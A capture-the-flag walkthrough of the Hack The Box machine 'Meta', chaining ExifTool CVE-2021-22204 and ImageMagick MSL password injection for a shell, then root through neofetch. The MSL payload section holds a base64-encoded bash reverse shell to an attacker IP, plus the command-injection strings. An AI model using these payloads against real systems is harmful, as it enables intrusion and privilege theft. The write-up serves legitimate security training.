# Meta

# services

```bash

└─$ nmap -sC -sV -p 22,80 -o nmap/tcp-script 10.129.164.233
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 20:31 EDT
Nmap scan report for 10.129.164.233
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 1281175a5ac9c600dbf0ed9364fd1e08 (RSA)
|   256 b5e55953001896a6f842d8c7fb132049 (ECDSA)
|_  256 05e9df71b59f25036bd0468d05454420 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://artcorp.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.71 seconds
```

Only 2 services running on this box:
* 22 - ssh - 19.10 Ubuntu eoan
* 80 - http - Apache httpd
    * redirecting to http://artcorp.htb

### http

The web application is a barebones front page with no ways to manually spider. I ran gobuster and nothing reachable was returned. 


The application did state that they have a product in testing phase and are "Development in progress", so I think there may be a dev path somewhere.

After gobuster failed and I ran out of paths I decided to fuzz the server for virtual hosting domains:

```bash

┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/SecList/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.129.164.233 -H "Host: FUZZ.artcorp.htb" -fs 0

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.164.233
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecList/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.artcorp.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

[Status: 200, Size: 247, Words: 16, Lines: 10, Duration: 50ms]
    * FUZZ: dev01

:: Progress: [4989/4989] :: Job [1/1] :: 826 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```
Alas we find out dev environment at **dev01.artcorp.htb**
Here we have an application called MetaView that allows us to upload files and it returns the metadata.

Attempted to run gobuster to find uploads path for file upload vuln, but none found...

> The metadata returned resembles how exiftool returns metadata, so this application could just be using the exiftool binary to fetch the metadata of the file we upload and the filter the results.

### Exiftool Arbitrary Code Execution - CVE-2021-22204

There is a vulnerability in Exiftool caused by inproper neutralization of user data in DjVu file format. By using a specially crafted image we can execute arbitrary code on the system. The vulnerability is located in a branch of the script that parses djVu files, which are:

> a computer file format designed primarily to store scanned documents, especially those containing a combination of text, line drawings, indexed color images, and photographs. It uses technologies such as image layer separation of text and background/images, progressive loading, arithmetic coding, and lossy compression for bitonal (monochrome) images. This allows high-quality, readable images to be stored in a minimum of space, so that they can be made available on the web.

There are a number of scripts to pick from for this CVE, I picked this one, https://github.com/UNICORDev/exploit-CVE-2021-22204, because its easy to use and the the UI.

By supplying a command with -c option it creates a djVu file that when ran through exiftool will execute the command and be returned in the metadata
```bash
└─$ python3 unicordExifExploit.py -c 'whoami'

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....

UNICORD: Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution
PAYLOAD: (metadata "\c${system('whoami')};")
DEPENDS: Dependencies for exploit are met!
PREPARE: Payload written to file!
PREPARE: Payload file compressed!
PREPARE: DjVu file created!
PREPARE: JPEG image created/processed!
PREPARE: Exiftool config written to file!
EXPLOIT: Payload injected into image!
CLEANUP: Old file artifacts deleted!
SUCCESS: Exploit image written to "image.jpg"

```
-s options can be used to start a reverse shell followed by ip & port

After uploading our image.jpg the command will be exuecuted and we can catch the reverse shell

### PrivEsc

We are on the box as www-data after catching the reverse shell. 
After searching through common privesc routes and not finding anything interesting, I decide to try out pspy to see if a process is being ran on the system thats not shown in ps return.

After leaving pspy on for a few minutes I do see a script being executed by thomas periodically and www-data has read access to said script.
```bash

2023/06/04 12:08:01 CMD: UID=0    PID=21734  | /usr/sbin/CRON -f
2023/06/04 12:08:01 CMD: UID=0    PID=21733  | /usr/sbin/cron -f
2023/06/04 12:08:01 CMD: UID=0    PID=21732  | /usr/sbin/CRON -f
2023/06/04 12:08:01 CMD: UID=1000 PID=21735  | /bin/sh -c /usr/local/bin/convert_images.sh
2023/06/04 12:08:01 CMD: UID=1000 PID=21736  | /bin/bash /usr/local/bin/convert_images.sh
```
These processes are being run and the script convert_images.sh is using the ImageMagick Mogrify tool to convert the uploaded files to PNG files:
```bash

# cat convert_images.sh
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```
At first I attempted to create a new pkill binary and add its path to the PATH environment variable, but that does not work, because the script is being executed by Thomas who has a different PATH variable.

However, mogrify and the ImageMagick software suite does have a vulnerability in the version being used:
```bash
# mogrify -version
Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
```
This vulnerability allows shell commands to be injected when assigning a pdf password. It has to do with how quotations are handled with the password provided.
This command:
```bash 
convert -authenticate "password" test.pdf out.png
```
will create the following command:
```bash
'gs' -sstdout=%stderr -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 '-sDEVICE=pngalpha' -dTextAlphaBits=4
 -dGraphicsAlphaBits=4 '-r72x72' "-sPDFPassword=password" '-sOutputFile=/tmp/magick-YPvcqDeC7K-Q8xn8VZPwHcp3G1WVkrj7%d' '-f/tmp/magick-sxCQc4-ip-mnuSAhGww-6IFnRQ46CBpD' '-f/tmp/magick-pU-nIhxrRulCPVrGEJ868knAmRL8Jfw9'
```
Which seems normal, but when we inject quotations within our password value provided we are able to close the -sPDFPassword parameter prematurely and allow us to inject a shell command inline. 
```bash
convert -authenticate 'test" FFFFFF' test.pdf out.png
```
Looking at the -sPDFPassword parameter we can see that the double quote provided closed the parameter injected FFFFF into the command. 
```bash
'gs' -sstdout=%stderr -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 '-sDEVICE=pngalpha' -dTextAlphaBits=4
 -dGraphicsAlphaBits=4 '-r72x72' "-sPDFPassword=test" FFFFFF" '-sOutputFile=/tmp/magick-YPvcqDeC7K-Q8xn8VZPwHcp3G1WVkrj7%d' '-f/tmp/magick-sxCQc4-ip-mnuSAhGww-6IFnRQ46CBpD' '-f/tmp/magick-pU-nIhxrRulCPVrGEJ868knAmRL8Jfw9
```

In order to set the -authenticate parameter we can use a supported file type MSL (ImageMagick Scripting Language). This is a XML based file format supported by ImageMagick, which allows to set the input file, output file and additional parameters.

We can use the MSL file to set the authenticate parameter and execute our code.
#### POC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<image authenticate='test" `echo $(id)> ./poc`;"'>
  <read filename="test.pdf" />
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="out.png" />
</image>
```

```bash
<image authenticate='ff" `echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC85OTk5ICAwPiYxICAg | base64 -d | bash`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="0" height="0" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">      
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```
Now I was following a writeup on this vulnerability and The author creates a SVG/MSL polyglot file. A polyglot is a file that is valid for two different file specifications.
This file will be parsed as an svg image and then when the image tage is parsed it will parse the file again as an MSL leading to code execution.

After placing this file into the /converted_images folder all thats left is to wait with a listener to catch the reverse shell from Thomas.

### PriveEsc - ROOT

The flag is found Thomas' home directory.

Thomas has sudo permissions to run neofetch:
```bash

thomas@meta:~$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"
```
This output also hints at our exploit with the env_keep variable.

Looking at GTFOBins we see that a --config option can be used to use a different config file at runtime.
```bash
TF=$(mktemp)
echo 'exec /bin/sh' >$TF
sudo neofetch --config $TF
```
However, our sudo permission doesn't allow for any options to be used with neofectch, so we need to find another way to get neofetch to use your malicious config file.
In the sudoers file for Thomas the env_keep variable is set to XDG_CONFIG_HOME. env_keep defines environment variable that are preserved when the user changes, like when sudo is used. XDG_CONFIG_HOME is the directory where user configs are stored.

Neofetch source uses a get_user_config() function to load a config file from:
* a location provided with --config option
* `${XDG_CONFIG_HOME}/neofetch/config.conf`
* `${XDG_CONFIG_HOME}/neofetch/config`
* nowhere if `$no_config` is set

And then if all those locations fail it copies the default config from `${XDG_CONFIG_HOME}/neofetch/config.conf`


Since we do not have the XDG_CONFIG_HOME variable set, we need to set it to the .config directory in thomas' home directory and then change the config.conf file to the `exec /bin/bash` line and then run neofetch with sudo.
This will result in neofetch loading the malicious config.conf file with the `get_user_config()` function and then create a new shell as **root**.

```bash
thomas@meta:~/.config/neofetch$ echo 'exec /bin/sh' > config.conf
thomas@meta:~/.config/neofetch$ echo $XDG_CONFIG_HOME
/home/thomas/.config
thomas@meta:~/.config/neofetch$ sudo neofetch
# 
```
And root flag is in in roots home dir
